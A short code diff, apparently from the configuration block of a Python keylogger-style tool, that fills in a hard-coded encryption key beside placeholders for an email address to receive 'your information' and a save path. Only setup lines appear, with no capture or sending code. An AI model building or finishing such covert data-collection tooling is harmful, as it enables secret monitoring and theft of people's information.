@@ -52,7 +52,7 @@ username = getpass.getuser()
 
 toaddr = " " # Enter the email address you want to send your information to
 
-key = "" # Generate an encryption key from the Cryptography folder
+key = "sjafjkj9u849798wtkjfdllasu48usjofdijfjjslaju489uoajfskds" # Generate an encryption key from the Cryptography folder
 
 file_path = " " # Enter the file path you want your files to be saved to
 extend = "\\"
